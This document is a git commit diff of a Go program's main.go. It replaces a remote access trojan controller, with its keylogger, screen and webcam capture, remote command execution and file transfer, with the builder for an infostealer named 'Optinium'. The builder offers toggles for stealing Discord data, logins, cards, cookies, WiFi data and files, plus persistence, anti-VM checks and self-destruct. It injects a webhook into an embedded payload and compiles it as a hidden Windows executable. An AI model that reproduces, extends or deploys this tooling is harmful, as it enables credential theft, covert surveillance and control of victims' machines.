791739f4e62b93b79c1bc9e73a1ee722f101bad8
ZeyTroX <thomaskremmer94@gmail.com>
2025-04-12 12:36:52 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,600 +1,129 @@
 package main
 
 import (
-	"bufio"
-	"bytes"
 	_ "embed"
-	"errors"
 	"fmt"
-	"image/jpeg"
-	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strconv"
 	"strings"
-	"sync"
-	"time"
+	"syscall"
 
-	"fyne.io/fyne/v2"
-	"fyne.io/fyne/v2/app"
-	"fyne.io/fyne/v2/canvas"
-	"fyne.io/fyne/v2/container"
-	"fyne.io/fyne/v2/dialog"
-	"fyne.io/fyne/v2/theme"
-	"fyne.io/fyne/v2/widget"
-	"github.com/ulikunitz/xz"
+	"github.com/sqweek/dialog"
+	webview "github.com/webview/webview_go"
 )
 
-//go:embed lib/client.req
-var cliData []byte
+//go:embed lib/index.html
+var html string
+
+//go:embed lib/payload.go
+var payloadBase string
+
+//go:embed lib/optinium.go
+var optinium string
 
 var (
-	tableData = [][]string{
-		{"ID", "IP", "Country", "Username", "OS", ""},
+	options = map[string]bool{
+		"SystemData":   false,
+		"DiscordData":  false,
+		"LoginData":    false,
+		"VisitedURLs":  false,
+		"SelfDestruct": false,
+		"FakeError":    false,
+		"IpData":       false,
+		"CardData":     false,
+		"WifiData":     false,
+		"Screenshot":   false,
+		"Snapshot":     false,
+		"Persist":      false,
+		"AntiVM":       false,
+		"StealFiles":   false,
+		"CookieData":   false,
+		"Sleep":        false,
 	}
 
-	mutex sync.Mutex
-
-	selected Connection
-	clients  = []Connection{}
-	connects = 0
-
-	table     *widget.Table
-	Display   *widget.Entry
-	Building  *widget.Entry
-	myApp     fyne.App
-	myWindow  fyne.Window
-	streaming = false
-
-	filename string
+	exclude = []string{"SelfDestruct", "FakeError", "Screenshot", "Snapshot", "Persist", "AntiVM", "StealFiles", "Sleep"}
 )
 
-type Connection struct {
-	ip       string
-	hostname string
-	conn     net.Conn
-	reader   bufio.Reader
-	writer   bufio.Writer
+func run(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Run()
 }
 
-func notify(title string, message string) {
-	myApp.SendNotification(&fyne.Notification{title, message})
-}
-
-func writeCommand(command string) {
-	if selected.conn != nil {
-		selected.writer.WriteString(command + "\n")
-		selected.writer.Flush()
-	}
-}
-
-func handleServer() {
-	server, err := net.Listen("tcp", "0.0.0.0:3000")
-	if err != nil {
-		os.Exit(1)
-	}
-	for {
-		client, err := server.Accept()
-		if err != nil {
-			continue
-		}
-		NewConn := Connection{"", "", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
-		info, err := NewConn.reader.ReadString('\n')
-		if err != nil {
-			removeClient(&selected)
-		} else if strings.Contains(info, ";") {
-			addClient(&NewConn, info)
-			go handleClient(&NewConn)
+func in(option string, slice []string) bool {
+	for _, i := range slice {
+		if option == i {
+			return true
 		}
 	}
+	return false
 }
 
-func addClient(client *Connection, Info string) {
-	Data := strings.Split(Info, ";")
-	client.ip = Data[0]
-	client.hostname = Data[2]
-	mutex.Lock()
-	tableData = append(tableData, append([]string{strconv.Itoa(connects)}, append(Data, []string{""}...)...))
-	clients = append(clients, *client)
-	mutex.Unlock()
-	connects++
-	go notify("New client connected!", fmt.Sprintf("Connection from %v!", client.ip))
-	table.Refresh()
-}
-
-func compress(data []byte) []byte {
-	var buff bytes.Buffer
-
-	writer, _ := xz.NewWriter(&buff)
-	writer.Write(data)
-	writer.Close()
-
-	return buff.Bytes()
-}
-
-func decompress(data []byte) []byte {
-	var buff bytes.Buffer
-
-	reader, _ := xz.NewReader(bytes.NewReader(data))
-	buff.ReadFrom(reader)
-
-	return buff.Bytes()
-}
-
-func removeClient(client *Connection) {
-	for i, cli := range clients {
-		if cli.conn == client.conn {
-			client.conn.Close()
-			mutex.Lock()
-			clients = append(clients[:i], clients[i+1:]...)
-			tableData = append(tableData[:i+1], tableData[i+2:]...)
-			mutex.Unlock()
-			connects--
-			go notify("Client disconnected!", fmt.Sprintf("%v timed out!", client.ip))
-		}
-	}
-	table.Refresh()
-}
-
-func handleClient(client *Connection) {
-	for {
-		if selected.conn == client.conn {
-			out, err := client.reader.ReadString('\n')
-			if err != nil {
-				removeClient(client)
-				selected = Connection{}
-			}
-			out = strings.TrimSpace(out)
-			switch out {
-			case "<SCREEN>":
-				img, _ := jpeg.Decode(client.conn)
-				Screen := myApp.NewWindow("Screenshot")
-				Screen.Resize(fyne.NewSize(600, 400))
-				Screen.SetFixedSize(true)
-				Screen.SetContent(canvas.NewImageFromImage(img))
-				Screen.Show()
-
-			case "<SHARE>":
-				streaming = true
-				Screen := myApp.NewWindow("Share")
-				Screen.Resize(fyne.NewSize(600, 400))
-				Screen.SetFixedSize(true)
-				Image := canvas.NewImageFromImage(nil)
-				Screen.SetContent(Image)
-				Screen.Show()
-				for streaming {
-					img, _ := jpeg.Decode(selected.conn)
-					Image.Image = img
-					Image.Refresh()
-					time.Sleep(time.Millisecond * 50)
-				}
-				Screen.Close()
-
-			case "<START>":
-				content := readAll("<END>")
-				Display.SetText(content)
-
-			case "<LOG>":
-				data := readAll("<END>")
-				os.WriteFile(fmt.Sprintf("%v@keylog.log", selected.hostname), []byte(data), 0644)
-				dialog.NewInformation("Keylog Saved!", fmt.Sprintf("Keylog saved in '%v@keylog.log'.", selected.hostname), myWindow).Show()
-				exec.Command("explorer.exe", ".\\").Start()
-
-			case "<DOWNLOAD>":
-				data := readAll("<END>")
-				os.WriteFile(filename, decompress([]byte(data)), 0644)
-				exec.Command("explorer.exe", ".\\").Start()
-
-			case "<ERR>":
-				streaming = false
-			}
-		}
-		time.Sleep(time.Millisecond * 200)
-	}
-}
-
-func build(host, port string) {
-	time.Sleep(time.Millisecond * 500)
-	Building.SetText(Building.Text + "[+] Building process initialised.\n")
-
+func compile(payload string) []byte {
 	os.Mkdir("build", 0644)
 	os.Chdir("build")
-	time.Sleep(time.Millisecond * 400)
-	Building.SetText(Building.Text + "[+] Client code successfully opened.\n")
 
-	code := strings.Replace(string(cliData), "<HOST>", host, 1)
-	code = strings.Replace(code, "<PORT>", port, 1)
-	time.Sleep(time.Millisecond * 600)
-	Building.SetText(Building.Text + "[+] HOST/PORT parameters injected.\n")
-	os.WriteFile("build.go", []byte(code), 0644)
-	Building.SetText(Building.Text + "[+] Client process closed.\n")
-	time.Sleep(time.Millisecond * 300)
-	Building.SetText(Building.Text + "[+] Golang compiler detected and ready.\n")
-	time.Sleep(time.Millisecond * 300)
-	Building.SetText(Building.Text + "[+] Compilation process started.\n")
-	exec.Command("go.exe", "mod", "init", "build").Run()
-	exec.Command("go.exe", "mod", "tidy").Run()
-	exec.Command("go.exe", "build", "--ldflags", "-s -w -H windowsgui -buildid=", "build.go").Run()
-	Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
-	time.Sleep(time.Millisecond * 200)
-	Building.SetText(Building.Text + "[+] Cleanup in progress...\n")
-	os.Remove("go.mod")
-	os.Remove("go.sum")
-	os.Remove("build.go")
-	time.Sleep(time.Millisecond * 900)
-	Building.SetText(Building.Text + "[+] Build process completed successfully!\n\n")
-	exec.Command("explorer.exe", ".\\").Start()
+	os.WriteFile("build.go", []byte(payload), 0644)
+
+	os.Mkdir("optinium", 0644)
+	os.WriteFile("optinium/optinium.go", []byte(optinium), 0644)
+
+	run("go.exe", "mod", "init", "main")
+	run("go.exe", "mod", "tidy")
+	run("go.exe", "build", "-trimpath", "--ldflags", "-s -w -H windowsgui -buildid=", "build.go")
+
+	data, _ := os.ReadFile("build.exe")
+
 	os.Chdir("..")
+	os.RemoveAll("build")
 
+	return data
 }
 
-func readAll(EOF string) string {
-	var LOG strings.Builder
-	for {
-		out, err := selected.reader.ReadString('\n')
-		if err != nil {
-			removeClient(&selected)
-			selected = Connection{}
-			break
-		}
-		if strings.TrimSpace(out) == EOF {
-			return LOG.String()
-		} else if out != "" {
-			LOG.WriteString(out)
+func build(webhook string) {
+	payload := strings.Replace(payloadBase, "<WEBHOOK>", webhook, 1)
+
+	for option, value := range options {
+		if value {
+			if in(option, exclude) {
+				switch option {
+				case "SelfDestruct":
+					payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("defer optinium.%v()", option), 1)
+				default:
+					payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("optinium.%v()", option), 1)
+				}
+
+			} else {
+				payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), fmt.Sprintf("DATA.WriteString(optinium.%v())", option), 1)
+			}
+		} else {
+			payload = strings.Replace(payload, fmt.Sprintf("<%v>", option), "", 1)
 		}
 	}
-	return ""
+
+	data := compile(payload)
+
+	path, _ := dialog.File().Filter("Executable Files", "exe").Title("Save crypted file").SetStartFile("payload.exe").Save()
+	os.WriteFile(path, data, 0644)
+
+	exec.Command("explorer.exe", filepath.Dir(path)).Start()
 }
 
 func main() {
-	myApp = app.NewWithID("Spectre")
+	window := webview.NewWindow(false, nil)
+	window.SetSize(600, 700, webview.HintFixed)
+	window.SetTitle("Optinium | Main")
 
-	myWindow = myApp.NewWindow("Spectre")
-	myWindow.Resize(fyne.NewSize(900, 600))
-	myWindow.SetFixedSize(true)
-	myWindow.SetIcon(theme.VisibilityIcon())
+	window.SetHtml(html)
 
-	Building = widget.NewMultiLineEntry()
-	Building.SetPlaceHolder("Build status...")
-	Building.SetMinRowsVisible(22)
+	window.Bind("toggleState", func(id string) {
+		options[id] = !options[id]
+	})
 
-	Display = widget.NewMultiLineEntry()
-	Display.SetPlaceHolder("Your responses will appear here...")
-	Display.SetMinRowsVisible(26)
+	window.Bind("buildExe", func(webhook string) {
+		go build(webhook)
+	})
 
-	portEntry := widget.NewEntry()
-	portEntry.PlaceHolder = "Port..."
-
-	hostEntry := widget.NewEntry()
-	hostEntry.PlaceHolder = "Host..."
-
-	err := dialog.NewError(errors.New("No client selected!"), myWindow)
-
-	table = widget.NewTable(
-		func() (rows int, cols int) { return len(tableData), 6 },
-		func() fyne.CanvasObject { return widget.NewLabel("255.255.255.255") },
-		func(id widget.TableCellID, cell fyne.CanvasObject) {
-			cell.(*widget.Label).SetText(tableData[id.Row][id.Col])
-		})
-
-	table.OnSelected = func(id widget.TableCellID) {
-		if id.Row > 0 {
-			selected = clients[id.Row-1]
-		} else {
-			selected = Connection{}
-		}
-	}
-
-	go handleServer()
-
-	myEntry1 := widget.NewEntry()
-	myEntry2 := widget.NewEntry()
-	myEntry3 := widget.NewEntry()
-
-	toolbar := container.NewVBox(
-		widget.NewButtonWithIcon("Information", theme.InfoIcon(), func() {
-			if selected.conn != nil && !streaming {
-				writeCommand("\x01")
-			} else {
-				err.Show()
-			}
-
-		}),
-		widget.NewButtonWithIcon("Screen Share", theme.ComputerIcon(), func() {
-			if selected.conn != nil {
-				dialog.NewCustomConfirm("Screen Share", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x02")
-						writeCommand("1")
-					} else if streaming && !b {
-						writeCommand("\x02")
-						writeCommand("0")
-						streaming = false
-					}
-				}, myWindow).Show()
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Camera Share", theme.MediaVideoIcon(), func() {
-			if selected.conn != nil {
-				dialog.NewCustomConfirm("Camera Share", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x16")
-						writeCommand("1")
-					} else if streaming && !b {
-						writeCommand("\x16")
-						writeCommand("0")
-						streaming = false
-					}
-				}, myWindow).Show()
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Open Url", theme.MailAttachmentIcon(), func() {
-			if selected.conn != nil && !streaming {
-				myEntry1.SetPlaceHolder("URL...")
-				dialog.NewCustomConfirm("URL", "Open", "Cancel", myEntry1, func(b bool) {
-					if b && strings.TrimSpace(myEntry1.Text) != "" {
-						writeCommand("\x03")
-						writeCommand(myEntry1.Text)
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-		widget.NewButtonWithIcon("Execute Command", theme.BrokenImageIcon(), func() {
-			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Command...")
-				dialog.NewCustomConfirm("Executor", "Execute", "Cancel", myEntry1, func(b bool) {
-					if b && !streaming {
-						writeCommand("\x04")
-						writeCommand(myEntry1.Text)
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Clipboard Manager", theme.ContentCopyIcon(), func() {
-			if selected.conn != nil {
-				dialog.NewCustomConfirm("Clipboard", "PUT", "GET", widget.NewLabel("Select Method..."), func(b bool) {
-					if b {
-						myEntry1.SetPlaceHolder("Content...")
-						dialog.NewCustomConfirm("Clipboard", "Put", "Cancel", myEntry1, func(b bool) {
-							if b && !streaming {
-								writeCommand("\x05")
-								writeCommand("1")
-								writeCommand(myEntry1.Text)
-							}
-						}, myWindow).Show()
-					} else {
-						dialog.NewCustomConfirm("Clipboard", "Get", "Cancel", widget.NewLabel("Fetching content..."), func(b bool) {
-							if b && !streaming {
-								writeCommand("\x05")
-								writeCommand("0")
-							}
-						}, myWindow).Show()
-					}
-				}, myWindow).Show()
-
-				myEntry1.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Fake Error", theme.WarningIcon(), func() {
-			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Title...")
-				myEntry2.SetPlaceHolder("Message...")
-				dialog.NewCustomConfirm("FakeError", "Show", "Cancel", container.NewVBox(myEntry1, myEntry2), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x06")
-						writeCommand(myEntry1.Text)
-						writeCommand(myEntry2.Text)
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-				myEntry2.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Set Wallpaper", theme.CheckButtonIcon(), func() {
-			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Image Address...")
-				dialog.NewCustomConfirm("Wallpaper-Changer", "Change", "Cancel", container.NewVBox(myEntry1), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x15")
-						writeCommand(myEntry1.Text)
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Notification", theme.ErrorIcon(), func() {
-			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("App Name...")
-				myEntry2.SetPlaceHolder("Title...")
-				myEntry3.SetPlaceHolder("Message...")
-				dialog.NewCustomConfirm("Notifier", "Notify", "Cancel", container.NewVBox(myEntry1, myEntry2, myEntry3), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x07")
-						writeCommand(myEntry1.Text)
-						writeCommand(myEntry2.Text)
-						writeCommand(myEntry3.Text)
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-				myEntry2.SetText("")
-				myEntry3.SetText("")
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Screenshot", theme.ViewFullScreenIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					writeCommand("\x08")
-				}
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Snap", theme.MediaPhotoIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					writeCommand("\x17")
-				}
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Keylogger", theme.CheckButtonCheckedIcon(), func() {
-			if selected.conn != nil {
-				dialog.NewCustomConfirm("Keylogger", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
-					if b && !streaming {
-						writeCommand("\x09")
-						writeCommand("1")
-					} else if !streaming {
-						writeCommand("\x09")
-						writeCommand("0")
-					}
-				}, myWindow).Show()
-			} else {
-				err.Show()
-			}
-		}),
-
-		widget.NewButtonWithIcon("Shutdown", theme.MoveDownIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					writeCommand("\x10")
-				}
-			} else {
-				err.Show()
-			}
-
-		}),
-
-		widget.NewButtonWithIcon("Restart", theme.MediaReplayIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					writeCommand("\x11")
-				}
-			} else {
-				err.Show()
-			}
-
-		}),
-
-		widget.NewButtonWithIcon("Lock Screen", theme.VisibilityOffIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					writeCommand("\x12")
-				}
-			} else {
-				err.Show()
-			}
-
-		}),
-
-		widget.NewButtonWithIcon("Download", theme.DownloadIcon(), func() {
-			if selected.conn != nil {
-				if !streaming {
-					myEntry1.SetPlaceHolder("Remote Path...")
-					dialog.NewCustomConfirm("Download", "Download", "Cancel", myEntry1, func(b bool) {
-						if b && !streaming {
-							writeCommand("\x13")
-							writeCommand(strings.TrimSpace(myEntry1.Text))
-							filename = filepath.Base(strings.TrimSpace(myEntry1.Text))
-						}
-					}, myWindow).Show()
-					myEntry1.SetText("")
-				}
-			} else {
-				err.Show()
-			}
-
-		}),
-
-		widget.NewButtonWithIcon("Upload", theme.UploadIcon(), func() {
-			if selected.conn != nil {
-				myEntry1.SetPlaceHolder("Local Path...")
-				dialog.NewCustomConfirm("Upload", "Upload", "Cancel", myEntry1, func(b bool) {
-					if b && !streaming {
-						if _, err := os.Stat(strings.TrimSpace(myEntry1.Text)); err == nil {
-							data, err := os.ReadFile(strings.TrimSpace(myEntry1.Text))
-							if err == nil {
-								writeCommand("\x14")
-								writeCommand(filepath.Base(strings.TrimSpace(myEntry1.Text)))
-								writeCommand(string(compress(data)))
-								writeCommand("<END>")
-							}
-						} else {
-							dialog.NewError(errors.New("File not found!"), myWindow)
-						}
-					}
-				}, myWindow).Show()
-				myEntry1.SetText("")
-
-			} else {
-				err.Show()
-			}
-		}),
-	)
-
-	tabs := container.NewAppTabs(
-		container.NewTabItemWithIcon("Home", theme.HomeIcon(), container.NewBorder(nil, nil, nil, container.NewVScroll(toolbar), table)),
-		container.NewTabItemWithIcon("Builder", theme.SettingsIcon(), container.NewVBox(
-			widget.NewLabelWithStyle("Builder", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
-			Building,
-			hostEntry,
-			portEntry,
-			widget.NewCard("", "", widget.NewButton("Build", func() {
-				port, err := strconv.Atoi(portEntry.Text)
-				Building.SetText("")
-				if strings.TrimSpace(hostEntry.Text) != "" && port > 0 && port < 65537 && err == nil {
-					go build(hostEntry.Text, portEntry.Text)
-				} else {
-					Building.SetText(Building.Text + "[-] Failed to start the build due to invalid HOST/PORT parameters!\n\n")
-					dialog.NewError(errors.New("Invalid input detected!"), myWindow).Show()
-				}
-				hostEntry.SetText("")
-				portEntry.SetText("")
-			})),
-		)),
-		container.NewTabItemWithIcon("Responses", theme.DocumentIcon(),
-			container.NewVBox(
-				widget.NewLabelWithStyle("Responses", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
-				Display,
-				widget.NewCard("", "", widget.NewButton("Save Response", func() {
-					os.WriteFile(fmt.Sprintf("%v@response.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
-					dialog.NewInformation("Response Saved!", fmt.Sprintf("Log saved in '%v@response.log'.", time.Now().Format("02.01")), myWindow).Show()
-					exec.Command("explorer.exe", ".\\").Start()
-				})),
-			),
-		),
-	)
-
-	tabs.SetTabLocation(container.TabLocationLeading)
-
-	myWindow.SetContent(tabs)
-	myWindow.ShowAndRun()
+	window.Run()
 }
